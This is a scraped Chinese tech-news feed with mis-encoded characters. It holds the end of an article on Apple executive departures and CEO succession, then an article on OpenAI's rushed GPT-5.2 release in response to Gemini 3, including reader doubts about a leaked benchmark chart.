<p>ä»–æ˜¯ä¸€ä½å®Œç¾çš„æ‰§è¡Œè€…ï¼Œå´é²œæœ‰å±•ç°å‡ºä¹”å¸ƒæ–¯å¼çš„å¯¹äº§å“çš„ç‹‚çƒ­ç›´è§‰ã€‚</p>
<p>æœ‰äººæ‰¹è¯„ä»–è¿‡äºè§„é¿é£é™©ï¼Œå¯¼è‡´ç¡¬ä»¶å›¢é˜Ÿç¼ºä¹å¤§èƒ†çš„åˆ›æ–°é¡¹ç›®ã€‚</p>
<p>å¦‚æœç‰¹åŠªæ–¯æ¥ç­ï¼Œä»–é¢ä¸´çš„å°†æ˜¯ä¸€ä¸ªåœ°ç‹±éš¾åº¦çš„å¼€å±€ï¼š</p>
<ul>
<li>**å†…éƒ¨ï¼š**å¦‚ä½•å‹æœåƒå…‹é›·æ ¼ Â· è´¹å¾·é‡Œå‰ï¼ˆCraig Federighiï¼Œè½¯ä»¶ä¸»ç®¡ï¼‰è¿™æ ·èµ„å†æ›´æ·±çš„å¤§ä½¬ï¼Ÿå¦‚ä½•ç•™ä½æ–¯é²å‰è¿™æ ·çš„æŠ€æœ¯å¤§æ‹¿ï¼Ÿ</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65d73febc7d14e0fa1ea5d609286ee58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=QNB%2FjxeG4P1FgnDuhnT3Re5YJOQ%3D" alt="" loading="lazy"/></p>
<ul>
<li>**å¤–éƒ¨ï¼š**å¦‚ä½•åœ¨ AI æ—¶ä»£é‡å¡‘è‹¹æœï¼Ÿ</li>
<li>**èˆ†è®ºï¼š**å¤–ç•ŒæœŸå¾…çš„æ˜¯å¦ä¸€ä¸ªä¹”å¸ƒæ–¯ï¼Œä½†è‹¹æœç»™å‡ºçš„ä¼¼ä¹æ˜¯å¦ä¸€ä¸ªåº“å…‹ã€‚</li>
</ul>
<p><strong>ã€Œ<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/185da94a50744d5db2f7f3ccea4ef7c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=4c5CcYh4FciI4hntZdIAea9fR7w%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œ7.3 åº“å…‹é¢¤æŠ–çš„æ‰‹ï¼Œä¸æ—¶ä»£çš„ä½™æ™–ã€</strong></p>
<p>ç”šè‡³è¿é“äººä¸€èˆ¬çš„è’‚å§† Â· åº“å…‹ï¼Œä¹Ÿæ˜¾éœ²å‡ºäº†å²æœˆçš„ç—•è¿¹ã€‚</p>
<p>è™½ç„¶ä»–ä¾ç„¶ä¿æŒç€å‡Œæ™¨ 4 ç‚¹èµ·åºŠçš„ä¹ æƒ¯ï¼Œä½†è¿‘æœŸåœ¨å…¬å¼€åœºåˆï¼Œç»†å¿ƒçš„äººä»¬å‘ç°ä»–çš„æ‰‹éƒ¨å‡ºç°äº†è½»å¾®çš„éœ‡é¢¤ã€‚</p>
<p>è¿™æˆ–è®¸æ˜¯ç”Ÿç†æ€§çš„ï¼Œä¹Ÿæˆ–è®¸æ˜¯å·¨å¤§çš„ç²¾ç¥å‹åŠ›æ‰€è‡´ã€‚</p>
<p>åº“å…‹æ— ç–‘æ˜¯ä¼Ÿå¤§çš„ã€‚</p>
<p>ä»–å°†è‹¹æœçš„å¸‚å€¼ç¿»äº†æ•°å€ï¼Œæ‰“é€ äº†æ— å¯åŒ¹æ•Œçš„ä¾›åº”é“¾ã€‚</p>
<p>ä½†ä»–æ¯•ç«Ÿæ˜¯ä¸Šä¸€ä¸ªæ—¶ä»£çš„èµ¢å®¶ã€‚å½“ä»–åœ¨ç™½å®«å°† 24K é‡‘åº•åº§çš„åº·å®ç»ç’ƒçºªå¿µç›˜é€ç»™ç‰¹æœ—æ™®æ—¶ï¼Œä»–ä¾ç„¶åœ¨ç”¨æ—§ä¸–ç•Œçš„é€»è¾‘ï¼ˆåˆ¶é€ ä¸šã€å…³ç¨ã€è´¸æ˜“ä¿æŠ¤ï¼‰æ¥ç»´æŠ¤è‹¹æœçš„åˆ©ç›Šã€‚</p>
<p>è€Œæ­¤æ—¶ï¼ŒOpenAI çš„å¥¥ç‰¹æ›¼æ­£åœ¨ç”¨ç®—åŠ›å¤–äº¤å’Œ AGI æ„¿æ™¯æ”¹å†™ä¸–ç•Œçš„è§„åˆ™ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e6349ffe1c324daeb0990d044a8e61dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=w%2BJ4Vx6DV%2F2aubff%2BlY3NZ2NikU%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œç»“è¯­ã€</strong></p>
<p>ç«™åœ¨ 2025 å¹´çš„å°¾å£°å›æœ›ï¼Œè‹¹æœä¾ç„¶æ˜¯è¿™ä¸ªæ˜Ÿçƒä¸Šæœ€èµšé’±çš„å…¬å¸ã€‚</p>
<p>Apple Park çš„è®¿å®¢ä¸­å¿ƒä¾ç„¶ä¼šäººæ»¡ä¸ºæ‚£ã€‚</p>
<p>ä½†åœ¨è¿™åº§å®Œç¾çš„å›´åŸä¹‹ä¸‹ï¼Œæš—æµå·²ç»æ¶ŒåŠ¨æˆæ²³ã€‚</p>
<p>å‡ ååé«˜ç®¡å’Œå·¥ç¨‹å¸ˆçš„ç¦»èŒï¼Œæˆ–è®¸æ„å‘³ç€ç¡…è°·åˆ›æ–°èŒƒå¼çš„è½¬ç§»ã€‚</p>
<p>Meta æ­£åœ¨ç”¨é»‘å®¢ç²¾ç¥é‡å¡‘ç¤¾äº¤ä¸ç¡¬ä»¶çš„è¾¹ç•Œï¼ŒOpenAI æ­£åœ¨ç”¨çº¯ç²¹çš„ç®—åŠ›æš´åŠ›ç¾å­¦å®šä¹‰æ™ºèƒ½çš„æœªæ¥ã€‚</p>
<p>è€Œè‹¹æœï¼Œè¿™å®¶æ›¾ç»ä»£è¡¨ç€ã€ŒThink Differentã€çš„å…¬å¸ï¼Œæ­¤åˆ»ä¼¼ä¹å˜å¾—è¿‡äºç›¸åŒâ€”â€”ç›¸åŒçš„è¿­ä»£èŠ‚å¥ï¼Œç›¸åŒçš„ç®¡ç†æ¶æ„ï¼Œä»¥åŠè¶Šæ¥è¶Šç›¸åŒçš„è°¨æ…ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/304531704de741a08ea531ce24179a48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=DdfyKFKrWua%2FvlVYIPXLguTfZeY%3D" alt="" loading="lazy"/></p>
<p>äººæ‰çš„æµåŠ¨ï¼Œæ°¸è¿œæ˜¯äº§ä¸šå…´è¡°æœ€è¯šå®çš„é£å‘æ ‡ã€‚</p>
<p>å½“é‚£äº›æœ€èªæ˜çš„å¤§è„‘å¼€å§‹è®¤ä¸ºã€Œå¦ä¸€ä¸ªåœ°æ–¹ã€æ›´é…·æ—¶ï¼Œä»…ä»…é é«˜è–ªã€å®Œç¾çš„åŠå…¬å¤§æ¥¼å’Œå…è´¹çš„é£Ÿå ‚æ˜¯ç•™ä¸ä½ä»–ä»¬çš„ã€‚</p>
<p>å› ä¸ºå¯¹äºè¿™äº›åˆ›é€ è€…æ¥è¯´ï¼Œä»–ä»¬ä¸ä»…æƒ³è¦ä¸€ä»½å·¥ä½œï¼Œä»–ä»¬æƒ³è¦çš„æ˜¯â€”â€”å‚ä¸æœªæ¥ã€‚</p>
<p>å¯¹äºåº“å…‹å’Œè¢«é€‰ä¸­çš„ç‰¹åŠªæ–¯æ¥è¯´ï¼Œæœ€å¤§çš„æŒ‘æˆ˜ï¼Œæˆ–è®¸åœ¨äºèƒ½å¦é‡æ–°ç‚¹ç‡ƒé‚£å›¢æ›¾è®©æ— æ•°å·¥ç¨‹å¸ˆå½»å¤œä¸çœ çš„ç†æƒ³ä¸»ä¹‰ä¹‹ç«ã€‚</p>
<p>å¦åˆ™ï¼Œæ­£å¦‚æµ·æ˜å¨åœ¨ã€Šå¤ªé˜³ç…§å¸¸å‡èµ·ã€‹ä¸­æ‰€è¨€ï¼šã€Œ<strong>ã€Œå¤ªé˜³ç…§å¸¸å‡èµ·ï¼Œä½†ä¸å†ç…§è€€åŒæ ·çš„å¸å›½ã€‚ã€</strong>ã€</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f3aa8855262245c4bbb4283e551ba239~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=GTqc8HFey9rvGJ4ZWjT%2BO%2BtSlMU%3D" alt="" loading="lazy"/></p>
<p>æµ·æ˜å¨</p>
<p>å‚è€ƒèµ„æ–™ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.theinformation.com%2Farticles%2Fsilicon-valley-buzzing-apple-ceo-succession" target="_blank" title="https://www.theinformation.com/articles/silicon-valley-buzzing-apple-ceo-succession" ref="nofollow noopener noreferrer">www.theinformation.com/articles/siâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bloomberg.com%2Fnews%2Farticles%2F2025-12-06%2Fapple-rocked-by-executive-departures-with-johny-srouji-at-risk-of-leaving-next" target="_blank" title="https://www.bloomberg.com/news/articles/2025-12-06/apple-rocked-by-executive-departures-with-johny-srouji-at-risk-of-leaving-next" ref="nofollow noopener noreferrer">www.bloomberg.com/news/articlâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¥¥ç‰¹æ›¼ä»“ä¿ƒäº®å‰‘ GPT-5.2ï¼ä¸€å¼ å›¾çˆ†ç«å…¨ç½‘ï¼Œå…¨é¢ç¢¾å‹ Gemini 3]]></title>    <link>https://juejin.cn/post/7580745065170485299</link>    <guid>https://juejin.cn/post/7580745065170485299</guid>    <pubDate>2025-12-08T02:54:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580745065170485299" data-draft-id="7580674010838548526" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¥¥ç‰¹æ›¼ä»“ä¿ƒäº®å‰‘ GPT-5.2ï¼ä¸€å¼ å›¾çˆ†ç«å…¨ç½‘ï¼Œå…¨é¢ç¢¾å‹ Gemini 3"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,OpenAI"/> <meta itemprop="datePublished" content="2025-12-08T02:54:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ–°æ™ºå…ƒ"/> <meta itemprop="url" content="https://juejin.cn/user/952600743642312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¥¥ç‰¹æ›¼ä»“ä¿ƒäº®å‰‘ GPT-5.2ï¼ä¸€å¼ å›¾çˆ†ç«å…¨ç½‘ï¼Œå…¨é¢ç¢¾å‹ Gemini 3
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/952600743642312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ–°æ™ºå…ƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T02:54:41.000Z" title="Mon Dec 08 2025 02:54:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/857af88717e04165a9aebaffb65a7d12~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767281&amp;x-signature=EIJaanvoqj%2FIPLTC83BIUkuCuj0%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-0"><strong>ã€Œã€æ–°æ™ºå…ƒå¯¼è¯»ã€‘Gemini 3 çš„æƒŠè‰³è¡¨ç°æ‰“ä¹±äº† OpenAI çš„é˜µè„šï¼Œå…¬å¸è¿›å…¥ã€Œçº¢è‰²è­¦æˆ’ã€çŠ¶æ€ï¼Œä¸å¾—ä¸æå‰å‘å¸ƒ GPT-5.2ï¼Œä»¥ä½œåº”å¯¹ã€‚ã€</strong></h5>
<p>ç´§æ€¥åå‡»ï¼</p>
<p>è‡ªä»è°·æ­Œæ”¾å‡º Gemini 3 ä¹‹åï¼ŒOpenAI å¿«è¢«é€¼ç–¯äº†ï¼Œå¥¥ç‰¹æ›¼ç”šè‡³å®£å¸ƒå…¬å¸è¿›å…¥äº†ã€Œçº¢è‰²è­¦æˆ’ã€çŠ¶æ€ã€‚</p>
<p>ç°åœ¨ï¼Œä»–ä»¬ç»ˆäºå‡ºæ‹›äº†â€”â€”ChatGPT-5.2ã€‚</p>
<p>æ® The Verge çˆ†æ–™ï¼Œç†Ÿæ‚‰ OpenAI è®¡åˆ’çš„æ¶ˆæ¯äººå£«é€éœ²ï¼ŒOpenAI å°†åœ¨ä¸‹å‘¨ï¼ˆ12 æœˆ 9 å·ï¼‰å‘å¸ƒ GPT-5.2ï¼Œé¦–æ¬¡å¯¹ Gemini 3 åšå‡ºæ­£é¢å›åº”ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8364ca3a009d4a82bb29084f0fbb0ea7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767281&amp;x-signature=8qz4GNoSD1swWES9qBBs%2BgSpt0s%3D" alt="" loading="lazy"/></p>
<p>æ®æ‚‰ï¼ŒGPT-5.2 å·²ç»å‡†å¤‡å°±ç»ªï¼ŒåŸè®¡åˆ’æœ¬æœˆä¸‹æ—¬å‘å¸ƒã€‚</p>
<p>ä½† Gemini 3 çš„æƒŠè‰³è¡¨ç°æ‰“ä¹±äº† OpenAI çš„é˜µè„šï¼Œä»–ä»¬ä¸å¾—ä¸æå‰å‘å¸ƒï¼Œåšå‡ºåº”å¯¹ã€‚</p>
<p>ã€ŠThe Informationã€‹æ—©äº›æ—¶å€™æŠ¥é“ç§°ï¼Œåœ¨ OpenAI å†…éƒ¨è¯„ä¼°ä¸­ï¼Œä»–ä»¬çš„ä¸‹ä¸€ä»£æ¨ç†æ¨¡å‹è¡¨ç°é¢†å…ˆäºè°·æ­Œçš„ Gemini 3ã€‚</p>
<p>ä¸çŸ¥é“æ­¤æ¬¡å‘å¸ƒçš„ GPT-5.2 æ˜¯ä¸æ˜¯ã€Œä¸‹ä¸€ä»£ã€ã€‚</p>
<p>ç½‘ä¸Šæµä¼ çš„ä¸€å¼  GPT-5.2 æµ‹è¯•åˆ†æ•°å›¾ç‰‡å€’è¿˜æ˜¯ç›¸å½“å¤¸å¼ çš„ã€‚</p>
<p>å›¾ç‰‡æ˜¾ç¤ºï¼ŒGPT-5.2 çš„åŸºå‡†æµ‹è¯•åˆ†æ•°å‡ ä¹å…¨é¢è¶…è¶Š Gemini 3 Proã€‚</p>
<p>æ–­å´–å¼é¢†å…ˆã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/edb860bac5054be79871f360940a0172~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767281&amp;x-signature=U1efCvnaJSBi0V7GDOOyTUNYuus%3D" alt="" loading="lazy"/></p>
<p>ä¸è¿‡ï¼Œç½‘å‹ä»¬å¤§éƒ½è´¨ç–‘è¿™å¼ å›¾ç‰‡çš„çœŸå®æ€§ã€‚</p>
<p>æ¯•ç«Ÿæˆ‘ä»¬ç°åœ¨ç”Ÿæ´»åœ¨å Nano Banana Pro æ—¶ä»£ã€‚</p>
<p>x ç½‘å‹ Wes Roth å°±å°†å›¾ç‰‡ä¸Šä¼ åˆ° Gemini åˆ†æï¼Œç»“æœ Gemini è®¤å®šè¿™å¼ å›¾å°±æ˜¯è°·æ­Œ AI ç”Ÿæˆçš„ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82371c80411f4a5d8ece0d0bb43789ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767281&amp;x-signature=fn9VLXQPmbqkWlCuK6fcN6884Lg%3D" alt="" loading="lazy"/></p>
<p>ç½‘å‹ Tanuki æŒ‡å‡ºï¼Œäººç±»æœ€åçš„è€ƒè¯• 67.4% çš„å¾—åˆ†æä¸å¯ä¿¡ã€‚</p>
<p>AIME 2025 100% ä»¥åŠ MMMLU 100% ä¹Ÿæ˜¯æå…¶å¯ç–‘ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/88b833b335ac4b968232c031e3ef3757~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767281&amp;x-signature=Hq6ixgs4CiSMy2V%2BzisZnqf%2FQUg%3D" alt="" loading="lazy"/></p>
<p>ç½‘å‹ Parousia ä¹Ÿè¡¨ç¤ºï¼Œè¿™å¼ å›¾å‡ ä¹å¯ä»¥è‚¯å®šæ˜¯è™šæ„çš„â€”â€”ã€Œçœ‹èµ·æ¥çº¯ç²¹æ˜¯æ„¿æœ›æŠ•å°„ã€ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6753b2fd056e46748d1a16e1a3200aea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767281&amp;x-signature=dFAIxFG8MzbI8bfAWEzNae4cqUQ%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/88e0ef6b9f404164af971e45bceb9515~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767281&amp;x-signature=HZXLE%2BRFpTH74wRxnPyVr%2FD84lU%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œå±æœºé‡é‡çš„ OpenAIã€</strong></p>
<p>è°·æ­Œå‘å¸ƒçš„ Gemini 3 æ‰€å±•ç°å‡ºçš„å¼ºæ‚ç«äº‰åŠ›ï¼Œè®© OpenAI æªæ‰‹ä¸åŠã€‚</p>
<p>è‡ªä» ChatGPT é—®ä¸–ä»¥æ¥ï¼Œå¯ä»¥è¯´å®ƒå°±æ˜¯æœ€å…ˆè¿›æ¨¡å‹çš„ä»£è¡¨ã€‚</p>
<p>è¿™æ˜¯é¦–æ¬¡å‡ºç°ç«äº‰å¯¹æ‰‹åœ¨åŸºå‡†æµ‹è¯•ä¸­å…¨é¢é¢†å…ˆçš„æƒ…å†µã€‚</p>
<p>åœ¨çŸ¥è¯†ã€æ•°å­¦å’Œç¼–ç¨‹é¢†åŸŸçš„å¤šé¡¹åŸºå‡†æµ‹è¯•ä¸­ï¼ŒGemini å·²ç»ç•¥å¾®é¢†å…ˆäº OpenAI çš„æœ€å…ˆè¿›æ¨¡å‹ã€‚</p>
<p>è¿™è®©å¾ˆå¤šäººä¸å†å°† OpenAI è§†ä¸ºé»˜è®¤çš„æ€§èƒ½æ ‡æ†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eca3dac40b2f4b009713aab79144fb3a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767281&amp;x-signature=xEk6rwgZW2VDQRIPzmkUgjdUdI0%3D" alt="" loading="lazy"/></p>
<p>æœ‰æ•°æ®æ˜¾ç¤ºï¼ŒOpenAI åœ¨ä¸€å‘¨å†…æµå¤±äº†å¤§çº¦ 6% çš„ç”¨æˆ·ï¼Œè¿™æ„å‘³ç€æ•°ç™¾ä¸‡ç”¨æˆ·è½¬å‘äº†å…¶ä»–å¹³å°ã€‚</p>
<p>è¿™å…¶ä¸­ï¼Œæœ€æœ‰å¯èƒ½çš„å°±æ˜¯è½¬å‘è°·æ­Œ Geminiã€‚</p>
<p>ChatGPT ç›®å‰æ‹¥æœ‰ 8 äº¿æœˆæ´»ç”¨æˆ·ï¼Œä½†å…¶ç§»åŠ¨ç«¯ä½¿ç”¨é‡å’Œä»˜è´¹å¢é•¿å·²é™·å…¥åœæ»ã€‚</p>
<p>è€Œç”¨æˆ·æ•°æ¥è¿‘ 6.5 äº¿çš„ Gemini å‡­å€Ÿåœ¨è°·æ­Œæœç´¢ã€å®‰å“ç³»ç»ŸåŠåŠå…¬å·¥å…·ä¸­çš„é›†æˆä¼˜åŠ¿æŒç»­æ‰©å¼ ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2aa1b9e3feed4f3c89f0ecad739e9605~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767281&amp;x-signature=kSg%2F2bWnEkXvE7q%2BSzGdaHwOi5A%3D" alt="" loading="lazy"/></p>
<p>OpenAI æŠ«éœ² 2025 å¹´è¥æ”¶çº¦ 130 äº¿ç¾å…ƒï¼Œä½†åˆ†æå¸ˆé¢„æµ‹å…¶åˆ° 2029 å¹´å¯èƒ½ç´¯è®¡äºæŸè¾¾ 1400 äº¿ç¾å…ƒã€‚</p>
<p>è€Œè°·æ­Œæ¯å­£åº¦èƒ½å¤Ÿåˆ›é€ çº¦ 300 äº¿ç¾å…ƒåˆ©æ¶¦ï¼Œè¶³ä»¥æ”¯æ’‘å…¶å¼€å‘æˆæœ¬æ›´ä½çš„åŠŸèƒ½ã€‚</p>
<p>å¥¥ç‰¹æ›¼å®£å¸ƒè¿›å…¥ã€Œçº¢è‰²è­¦æˆ’ã€çŠ¶æ€ï¼Œå®é™…ä¸Šæ˜¯ä¸€ä¸ªç´§æ€¥ä¿¡å·â€”â€”è®© ChatGPT é‡å›å·…å³°ã€‚</p>
<p>ä»–ä»¬ä¸ºæ­¤å…¨åŠ›ä¸“æ³¨äºæ­¤æ¬¡åº”å¯¹è¡ŒåŠ¨ã€‚</p>
